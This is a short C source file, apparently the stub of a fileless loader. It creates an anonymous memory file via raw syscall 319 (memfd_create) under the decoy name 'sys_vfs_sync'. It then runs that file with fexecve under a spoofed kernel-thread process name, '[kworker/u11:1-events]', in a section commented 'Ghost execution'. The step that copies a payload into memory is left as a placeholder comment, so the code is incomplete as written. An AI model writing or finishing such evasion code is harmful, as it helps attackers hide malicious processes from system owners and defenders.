#include <stdio.h>
#include <liburing.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;

    struct io_uring ring;
    io_uring_queue_init(8, &ring, 0);

    int fd = open(argv[1], O_RDONLY);
    int mfd = syscall(319, "sys_vfs_sync", 1); // memfd_create

    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    // Asynchronous read/write chain would go here
    
    // Ghost execution
    char *args[] = {"[kworker/u11:1-events]", NULL};
    char *env[] = {NULL};
    fexecve(mfd, args, env);

    return 0;
}
